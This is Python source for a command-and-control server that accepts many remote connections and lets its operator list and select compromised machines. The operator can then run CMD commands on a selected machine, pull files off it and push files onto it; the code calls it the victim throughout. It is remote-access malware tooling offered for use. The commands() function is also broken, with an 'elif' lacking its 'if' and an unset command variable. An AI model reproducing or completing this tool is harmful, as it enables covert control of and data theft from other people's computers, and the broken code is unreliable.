import socket
import threading
import sys
from queue import Queue 
all_connections = []
all_addresses = []
queue = Queue()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
s.bind(("",8000))  
def accepting_connections():    
    while True:
        try:
            global s
            s.listen(1000)  
            conn,address = s.accept()
            s.setblocking(1) #if a client has connected, if we do nothing it will timeout and discount. s.setblocking(1) prevents timeout     
            all_connections.append(conn)
            all_addresses.append(address)            
        except:
            print("Error in accepting conncetions")
def Greater_Console():
    print("[+] Succesfully established server, now running, for knowledge on commands, type help")  
    j = "Commands are as follow\nlist ~ provides list of active connections\nselect ? ~ where ? is the number from list\ntotal ~ the total number of active connections\nquit ~closes all conections and exit server\nhelp ~displays this print statement of commands" 
    while True:
        cmd = input('Greater_Console> ')
        if cmd =='list':
            results = ""
            for i,conn in enumerate(all_connections): 
                try:
                    conn.send(" ".encode("utf-8"))
                    conn.recv(1024)
                    results = results + f"{str(i)} {all_addresses[i][0]} {all_addresses[i][1]} \n"
                except:               
                    del all_connections[i]
                    del all_addresses[i]
                finally:
                    pass          
            print(results)       
        elif cmd[:6] == 'select':
            try:
                conn = all_connections[int(cmd[7:])]
                print(f" [+] Connection has been established with {all_addresses[int(cmd[7:])][0]} on port {all_addresses[int(cmd[7:])][1]}")
                print("Selected Device connected to, enter commands, if forgot the list of commands, type help ")  
                commands(conn)     
            except:
                print("The target cannot be selected")       
        elif cmd == "total":
            print(f"The total number of active connections are {len(all_connections)}")
        elif cmd == "quit":
            for numbers in all_connections:
                numbers.close()
            sys.exit()
        elif cmd == "help": 
            print(j)
        else:
            print("Command not recognized")
def commands(conn):
    conn.send("cd C:\\".encode("utf-8"))
    y = conn.recv(6000).decode("utf-8")
    while True: 
        print(y,end ="")
        elif len(cmd) > 0:
            if cmd == "download_file":
                conn.send(cmd.encode("utf-8"))
                filepath = input("Please enter the file path of victims file:")
                conn.send(filepath.encode("utf-8"))              
                filename = input("Please enter file name u want including extentsion:")         
                x = open(filename, "wb")
                file = conn.recv(6000)            
                while True:
                    conn.settimeout(1)
                    if (file):
                        x.write(file)
                        try:
                            file = conn.recv(6000)
                            print("after file")
                        except:
                            print("wrote file")
                            x.close()
                            break
                print("wrote file")
                break
            elif cmd == "send_file":
                conn.send(cmd.encode("utf-8"))
                filepath = input("Please enter filepath of file that you want to upload to victim:")
                file_path = input("Please enter the filepath of the victim where u want to upload the file to, and the name of the file with extension:")           
                conn.send(file_path.encode("utf-8"))              
                x = open(filepath,"rb")
                f = x.read()
                while (f):
                    conn.send(f)
                    f = x.read()            
                print("Done sending")
                x.close()                        
                print("Sent file")
                break                    
            elif cmd[:2] == "cd":
                conn.send(cmd.encode("utf-8"))
                y = conn.recv(6000).decode("utf-8")
            elif cmd == "help":
                print("List of commands\nquit ~ exits device connection\ndownload_file ~ downloads file\nsend_file ~ sends file (note cannot be exe)\ncd (directory) ~ changes directory\nOther commands include the CMD, as access to CMD commands is given here")
            else:               
                conn.send(cmd.encode("utf-8")) 
                client_response = conn.recv(6000).decode("utf-8") 
                print(client_response)    
        else:
            print("Error")        
def threader():
    for total_threads in range(2):
        t = threading.Thread(target=master) 
        t.daemon = True 
        t.start()
def master():
    while True:
        x = queue.get()
        if x == 1:
            print("here")
            accepting_connections()
        if x == 2:     
            Greater_Console()          
        queue.task_done()
def run():
    for n in [1,2]:
        queue.put(n)
    queue.join()
threader()
run()
